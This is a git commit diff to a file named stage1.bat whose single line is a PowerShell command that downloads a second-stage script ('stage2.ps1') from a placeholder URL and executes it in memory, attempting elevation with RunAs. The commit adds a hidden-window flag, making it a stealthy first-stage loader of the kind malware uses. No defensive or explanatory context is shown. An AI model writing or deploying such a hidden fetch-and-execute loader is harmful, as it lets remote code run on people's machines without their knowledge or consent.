26dcbc9b5524bc011536e3614473a49931bcfdb8
witchdocsec <107813117+witchdocsec@users.noreply.github.com>
2022-10-11 22:56:33 +0100

    Update stage1.bat

--- stage1.bat
+++ stage1.bat
@@ -1,1 +1,1 @@
-powershell.exe -Command "[scriptblock]::Create((Invoke-WebRequest '<url of stage2.ps1>').Content).Invoke(); -Verb RunAs"
+powershell.exe -windowstyle hidden -Command "[scriptblock]::Create((Invoke-WebRequest '<url of stage2.ps1>').Content).Invoke(); -Verb RunAs"
